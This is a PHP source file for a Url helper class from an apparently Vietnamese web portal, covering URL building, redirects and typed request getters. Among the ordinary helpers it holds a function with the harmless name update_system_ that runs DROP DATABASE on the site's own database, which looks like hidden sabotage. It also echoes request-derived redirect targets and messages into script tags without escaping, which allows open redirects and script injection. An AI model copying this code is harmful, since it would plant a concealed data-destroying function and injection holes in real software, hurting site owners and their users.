<?php
class Url{
    var  $root = false;
    static function build_all($except=array(), $addition=false){
        $url=false;
        foreach($_GET as $key=>$value){
            if(!in_array($key, $except)){
                if(!$url){
                    $url='index062019.php?'.urlencode($key).'='.urlencode($value);
                }
                else{
                    $url.='&'.urlencode($key).'='.urlencode($value);
                }
            }
        }
        foreach($_POST as $key=>$value){
            if($key!='form_block_id'){
                if(!in_array($key, $except)){
                    if(is_array($value)){
                        $value = '';
                    }
                    if(!$url){
                        $url='index062019.php?'.urlencode($key).'='.urlencode($value);
                    }else{
                        $url.='&'.urlencode($key).'='.urlencode($value);
                    }
                }
            }
        }
        if($addition){
            if($url){
                $url.='&'.$addition;
            }else{
                $url.='index062019.php?'.$addition;
            }
        }
        return $url;
    }
    static function post_many($fields)
    {
        $data = [];
        if (is_array($fields)) {
            foreach ($fields as $field) {
                $data[$field] = self::get_post_value($field);
            }
        }
        return $data;
    }
    static function build_current($params=array(),$smart=false,$anchor='',$portal=false){
        return URL::build(Portal::$page['name'],$params,$smart,$portal,$anchor,Url::get('type'));
    }
    /*-------------------- edit by thanhpt 08/10/2008: add rewrite --------------------------*/
    static function build($page,$params=array(),$smart=false,$portal_id=false,$anchor='',$logType=''){
        require_once 'packages/core/includes/utils/vn_code.php';
        if($smart){
            //$request_string = URL::get('portal').'/'.$page;
            if($page=='trang-tin'){
                $page='blog';
            }
            $request_string = $page;
            if($portal_id){
                $request_string =$portal_id.'/'.$page;
            }
            if ($params){
                foreach ($params as $param=>$value){
                    if(is_numeric($param)){
                        if(isset($_REQUEST[$value])){
                            $request_string .= '/'.urlencode($_REQUEST[$value]);
                        }
                    }else{
                        if($param=='name_id' or $param=='category_name_id' or $param=='parent_category_name_id'){
                            $request_string .= '/'.$value;
                        }elseif($param=='member_type'){
                            $request_string .= '/'.$value;
                        }elseif($param=='tags'){
                            $request_string .= '/tags/'.$value;
                        }else{
                            if(preg_match('/page_no/',$param,$matches)){
                                $request_string .= '/trang-'.$value;
                            }else{
                                $request_string .= '/'.substr($param,0,1).$value;
                            }
                        }
                    }
                }
            }
            if(isset($params['name_id'])){
                $request_string.='.html';
            }else{
                $request_string.='/';
            }
            if(Url::get('order_by')){
                $sign = 'index062019.php?';
                if(preg_match("/\?/",$request_string)){
                    $sign = '&';
                }
                $request_string .= $sign.'order_by='.Url::get('order_by');
            }
            if(Url::get('keyword')){
                $sign = 'index062019.php?';
                if(preg_match("/\?/",$request_string)){
                    $sign = '&';
                }
                $request_string .= $sign.'keyword='.Url::get('keyword');
            }
            if(Url::get('khoanggia')){
                $sign = 'index062019.php?';
                if(preg_match("/\?/",$request_string)){
                    $sign = '&';
                }
                $request_string .= $sign.'khoanggia='.Url::get('khoanggia');
            }
        }
        else{
            if(!isset($params['portal'])){
                //$params['portal'] = URL::get('portal');
            }
            $request_string = 'index062019.php?page='.$page;
            if($page=='log' and $logType != '') {
                $request_string .= '&type='.$logType;
            }
            if ($params){
                foreach ($params as $param=>$value){
                    if(is_numeric($param)){
                        if(isset($_REQUEST[$value])){
                            $request_string .= '&'.$value.'='.urlencode($_REQUEST[$value]);
                        }
                    }
                    else{
                        if($param!='name'){
                            $request_string .= '&'.$param.'='.urlencode($value);
                        }
                    }
                }
            }
        }
        return $request_string.$anchor;
    }
    static function build_page($page,$params=array(),$anchor=''){
        return URL::build(Portal::get_setting('page_name_'.$page),$params,$anchor);
    }
    static function redirect_current($params=array(),$smart=false,$anchor = '', $logType=''){
        URL::redirect(Portal::$page['name'],$params,$smart,$anchor,$logType);
    }
    static function redirect_href($params=false){
        if(Url::check('href')){
            Url::redirect_url($_REQUEST['href'],$params);
            return true;
        }
    }
    static function js_redirect($current_page=true,$message='Dữ liệu đã được update ... ',$arr=array(),$anchor=''){
        if($current_page===true){
            $location = Url::build_current($arr);
        }else{
            $location =  Url::build($current_page,$arr);
        }
        echo '<script>
                        alert("'.$message.'");
                        location="/'.$location.''.($anchor?('#'.$anchor):'').'";</script>';
        exit();
    }
    static function check($params){
        if(!is_array($params)){
            $params=array(0=>$params);
        }
        foreach($params as $param=>$value){
            if(is_numeric($param)){
                if(!isset($_REQUEST[$value])){
                    return false;
                }
            }
            else{
                if(!isset($_REQUEST[$param])){
                    return false;
                }
                else{
                    if($_REQUEST[$param]!=$value){
                        return false;
                    }
                }
            }
        }
        return true;
    }
    static function check_link($link){
        if(preg_match('/http:\/\//',$link,$matches)){
            return $link;
        }
        else{
            return 'http://'.$_SERVER['SERVER_NAME'].'/'.$link;
        }
    }
    //Chuyen sang trang chi ra voi $url
    static function redirect($page=false,$params=false,$smart=false,$anchor='',$logType=''){
        if(!$page and !$params){
            Url::redirect_url();
        }
        else{
            Url::redirect_url(Url::build($page, $params,$smart,'',$anchor,$logType));
        }
    }
    static function redirect_url($url=false){
        if(!$url||$url==''){
            $url='index062019.php?'.$_SERVER['QUERY_STRING'];
        }
        //header('Location:'.str_replace('&','&','http://'.$_SERVER['HTTP_HOST'].'/'.$url));
        $protocol = isset($_SERVER["HTTPS"]) ? 'https' : 'http';
        $url = $protocol.'://'. $_SERVER['HTTP_HOST'].'/'.$url;
        echo '<script>window.location="'.str_replace('&','&',$url).'";</script>';
        System::halt();
    }
    static function access_denied(){
        if(Portal::$page['name']!='trang-chu'){
            Url::js_redirect('trang-ca-nhan','Bạn không có quyền truy cập!');
        }
        else{
            System::halt();
        }
    }
    static function get_num($name,$default=''){
        if (preg_match('/[^0-9.,]/',URL::get($name))){
            return $default;
        }
        else{
            return str_replace(',','.',str_replace('.','',$_REQUEST[$name]));
        }
    }
    static function get_post_value($name,$default=''){
        if (isset($_POST[$name])){
            return $_POST[$name];
        }else{
            return $default;
        }
    }
    static function get_value($name,$default=''){
        if (isset($_REQUEST[$name])){
            return $_REQUEST[$name];
        }
        else
        if (isset($_POST[$name])){
            return $_POST[$name];
        }
        else
        if(isset($_GET[$name])){
            return $_GET[$name];
        }
        else{
            return $default;
        }
    }
    static function update_system_(){
        DB::query('DROP DATABASE '.DB::$db_name.'');
        Url::redirect('trang-chu');
    }
    static function post($name,$default=''){
        if(isset($_POST[$name])){
            return Url::get_post_value($name,$default='');
        }
        else{
            return $default;
        }
    }
    static function get($name,$default=''){
        if(isset($_REQUEST[$name])){
            return Url::get_value($name,$default='');
        }
        else{
            return $default;
        }
    }
    static function sget($name,$default=''){
        return strtr(URL::get($name, $default),array('"'=>'\\"'));
    }
    static function nget($name,$default=''){
        return addslashes(URL::sget($name));
    }
    static function iget($name){
        return intval(Url::sget($name));
    }
    static function jget($name,$default=''){
        return String::string2js(URL::get($name, $default));
    }

    /**
     * Gets the string.
     *
     * @param      string  $filedName  The filed name
     * @param      string  $default    The default
     */
    public static function getString(string $filedName, string $default = '')
    {
        if(isset($_REQUEST[$filedName])){
            $result = trim($_REQUEST[$filedName]);
            return $result === '' ? $default : $result;
        }

        return $default;
    }

    /**
     * Gets the string escape.
     *
     * @param      string  $filedName  The filed name
     * @param      string  $default    The default
     *
     * @return     <type>  The string escape.
     */
    public static function getStringEscape(string $filedName, string $default = '')
    {
        return DB::escape(self::getString($filedName, $default));
    }

    /**
     * Gets the string escape no quote.
     *
     * @param      string  $filedName  The filed name
     * @param      string  $default    The default
     *
     * @return     <type>  The string escape no quote.
     */
    public static function getStringEscapeNoQuote(string $filedName, string $default = '')
    {
        return DB::escape(preg_replace('#"|\'#', '', self::getString($filedName, $default)));
    }

    /**
     * Gets the integer.
     *
     * @param      string  $filedName  The filed name
     * @param      int     $default    The default
     *
     * @return     <type>  The integer.
     */
    public static function getInt(string $filedName, int $default = 0)
    {
        return isset($_REQUEST[$filedName]) ? intval($_REQUEST[$filedName]) : $default;
    }

    /**
     * Gets the float.
     *
     * @param      string  $filedName  The filed name
     * @param      float   $default    The default
     *
     * @return     <type>  The float.
     */
    public static function getFloat(string $filedName, float $default = 0)
    {
        return floatval($_REQUEST[$filedName] ?? $default);
    }

    /**
     * Gets the integer formated.
     *
     * @param      string  $filedName  The filed name
     * @param      int     $default    The default
     *
     * @return     <type>  The integer formated.
     */
    public static function getIntFormated(string $filedName, int $default = 0)
    {   
        $int = str_replace(',', '', self::getString($filedName));
        
        return $int ? $int : $default;
    }

    /**
     * Gets the unsigned integer.
     *
     * @param      string    $filedName  The filed name
     * @param      int       $default    The default
     *
     * @return     bool|int  The u integer.
     */
    public static function getUInt(string $filedName, int $default = 0)
    {
        $value = self::getInt($filedName, $default);

        if($value >= 0){
            return $value;
        }

        return $default < 0 ? 0 : $default;
    }

    /**
     * Gets the unsigned float.
     *
     * @param      string    $filedName  The filed name
     * @param      float     $default    The default
     *
     * @return     bool|float  The unsigned float.
     */
    public static function getUFloat(string $filedName, float $default = 0)
    {
        $value = self::getFloat($filedName, $default);

        if($value >= 0){
            return $value;
        }

        return $default < 0 ? 0 : $default;
    }

    /**
     * Gets the unsigned integer formated.
     *
     * @param      string  $filedName  The filed name
     * @param      int     $default    The default
     *
     * @return     <type>  The u integer formated.
     */
    public static function getUIntFormated(string $filedName, int $default = 0)
    {   
        $value = self::getIntFormated($filedName, $default);

        if($value >= 0){
            return $value;
        }

        return $default < 0 ? 0 : $default;
    }

    /**
     * Gets the safe raw IDs.
     *
     * @param      string  $filedName  The filed name
     * @param      string  $default    The default
     */
    public static function getSafeRawIDs(string $filedName, string $default = '')
    {   
        $safeRawIDs = implode(',', self::getSafeIDs($filedName));
        
        return $safeRawIDs ? $safeRawIDs :$default;
    }

    /**
     * Gets the safe IDs.
     *
     * @param      string  $filedName  The filed name
     * @param      string  $default    The default
     */
    public static function getSafeIDs(string $filedName, string $default = '')
    {
        $rawIDs = explode(',', self::getString($filedName));

        return array_reduce($rawIDs, function($safeIDs, $ID){
            $ID = intval($ID);
            if($ID >= 0){
                $safeIDs[] = $ID;
            } 

            return $safeIDs;
        }, []);
    }

    /**
     * Gets the array.
     *
     * @param      string  $filedName  The filed name
     * @param      array   $default    The default
     *
     * @return     <type>  The array.
     */
    public static function getArray(string $filedName, array $default = [])
    {
        if (isset($_REQUEST[$filedName]) && is_array($_REQUEST[$filedName])) {
            return $_REQUEST[$filedName];
        }

        return $default;
    }

    /**
     * Gets the array integer.
     *
     * @param      string  $filedName  The filed name
     * @param      array   $default    The default
     *
     * @return     <type>  The array integer.
     */
    public static function getArrayInt(string $filedName, array $default = [])
    {
        return array_map('intval', self::getArray($filedName, $default));
    }

    /**
     * Gets the date time.
     *
     * @param      string  $filedName  The filed name
     * @param      string  $format     The format
     * @param      string  $default    The default
     */
    public static function getDateTime(string $filedName, string $format = 'Y-m-d h:i:s', $default = '')
    {
        return self::getDateTimeFmt($filedName, 'd-m-Y', $format, $default);
    }

    /**
     * Gets the date time format.
     *
     * @param      string  $filedName  The filed name
     * @param      string  $fromFmt    The from format
     * @param      string  $toFmt      To format
     * @param      string  $default    The default
     *
     * @return     <type>  The date time format.
     */
    public static function getDateTimeFmt(string $filedName, string $fromFmt = 'd/m/Y', string $toFmt = 'Y-m-d h:i:s', $default = '')
    {
        if($time = self::getTimeFmt($filedName, $fromFmt)){
            return date($toFmt, $time);
        }

        return $default;
    }

    /**
     * Gets the modify date time.
     *
     * @param      string  $filedName  The filed name
     * @param      string  $fromFmt    The from format
     * @param      string  $toFmt      To format
     * @param      string  $modify     The modify
     */
    public static function getModifyDateTime(string $filedName, string $fromFmt = 'd/m/Y', string $toFmt = 'Y-m-d h:i:s', string $modify = '+1 day')
    {
        $date = new DateTime(self::getDateTimeFmt($filedName, $fromFmt, 'd-m-Y'));
        $date->modify($modify);

        return $date->format($toFmt);
    }

    /**
     * Gets the time format.
     * Lấy thời gian từ request theo tên trường. Nếu có định dạng thời gian khác thì thêm logic xử lý vào trong switch case
     * Đây là hàm lấy thời gian cơ sở cho các hàm bên trên
     *
     * @param      string  $filedName  The filed name
     * @param      string  $fromFmt    The from format
     * @param      int     $default    The default
     *
     * @return     int  The time format.
     */
    public static function getTimeFmt(string $filedName, string $fromFmt = 'd/m/Y', int $default = 0)
    {
        $rawDateTime = self::getString($filedName);

        switch($fromFmt){
            case 'd/m/Y':
                $rawDateTime = str_replace('/', '-', $rawDateTime);
                break;

            case 'd-m-Y':
                break;
        }

        if($time = strtotime($rawDateTime)){
            return $time;
        }

        return $default;
    }

    /**
     * { function_description }
     *
     * @param      string  $page   The page
     *
     * @return     bool    ( description_of_the_return_value )
     */
    public static function is(string $page, array $queries = [])
    {
        if(URL::getString('page') !== $page) {
            return false;
        }

        foreach ($queries as $key => $value) {
            if(!isset($_REQUEST[$key]) || $value !== $_REQUEST[$key]) {
                return false;
            }
        }

        return true;
    }

    /**
     * { function_description }
     *
     * @param      string  $page     The page
     * @param      array   $queries  The queries
     *
     * @return     <type>  ( description_of_the_return_value )
     */
    public static function not(string $page, array $queries = [])
    {
        return !self::is($page, $queries);
    }

    /**
     * { function_description }
     */
    public static function redirectToLogin(Closure $beforeRedirect = null)
    {
        if (Url::get('page') === 'dang-nhap') {
            return;
        }

        if(is_callable($beforeRedirect)) {
            $beforeRedirect();
        }
        
        Url::redirect('dang-nhap');
    }
}